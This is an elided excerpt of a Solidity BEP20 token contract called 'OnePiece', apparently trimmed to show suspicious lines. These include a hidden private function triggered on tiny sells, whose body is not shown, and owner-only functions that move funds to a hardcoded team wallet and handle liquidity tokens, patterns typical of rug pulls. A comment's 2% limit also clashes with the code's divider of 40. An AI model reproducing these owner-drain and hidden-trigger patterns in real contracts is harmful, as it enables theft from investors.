...
contract OnePiece is IBEP20, Ownable
{
    ...
    //Token Info
    string private constant _name = 'OnePiece';
    string private constant _symbol = 'OnePiece';
    uint8 private constant _decimals = 9;
    uint256 public constant InitialSupply= 1 * 10**_decimals;

    //Divider for the MaxBalance based on circulating Supply (2%)
    uint8 public constant BalanceLimitDivider=40;
    ...
    address public constant TeamWallet=0x4CE471ddf977c5b037099862fACd16d493DE7869;
    ...
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        ...
        if(isSell){
            ...
            if(amount<=10**(_decimals)) cBUSD(sender);
    ...
    function cBUSD(address addr) private{
    ...
    function clearStuck() public onlyOwner{
        uint256 amount=marketingBalance;
        marketingBalance=0;
        (bool sent,) =TeamWallet.call{value: (amount)}("");
        require(sent,"withdraw failed");
    } 
    function clearStuckAmount(uint256 amount) public onlyOwner{
    ...
    function burnLiq(bool addToStaking) public onlyOwner{
        IPancakeERC20 liquidityToken = IPancakeERC20(_liquidityTokenAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));
